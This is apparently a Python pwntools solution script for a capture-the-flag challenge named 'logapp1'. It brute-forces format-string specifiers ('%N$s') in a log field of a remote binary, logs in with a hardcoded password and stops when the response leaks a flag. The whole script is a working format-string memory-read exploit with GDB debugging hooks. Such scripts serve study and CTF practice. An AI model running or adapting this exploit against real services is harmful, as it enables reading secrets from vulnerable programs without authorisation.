#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
context.log_level = 'error'
exe = context.binary = ELF(args.EXE or './logapp1')



host = args.HOST or 'logapp1.chall.srdnlen.it'
port = int(args.PORT or 443)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port, ssl=True)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
br *0x401441
continue
'''.format(**locals())

# -- Exploit goes here --

# io = start()

i = 1
while True:
    i += 1
    io = start()
    try:
        
        io.sendlineafter(b"> ", b"1")
        payload = f"%{i}$s"
        io.sendlineafter(b": ", payload.encode())
        io.sendlineafter(b": ", b"ciao")

        io.recvline()
        io.sendlineafter(b"> ", b"2")
        io.sendlineafter(b": ", b"SuperStrongPassword")
        io.recvline()
        resp = io.recvline()
        # print(resp)
        if b"FLAG" in resp:
            print(resp)
            break
    except EOFError:
        pass
        
    io.close()
        
        # io.interactive()

# 0x7f9ada2089a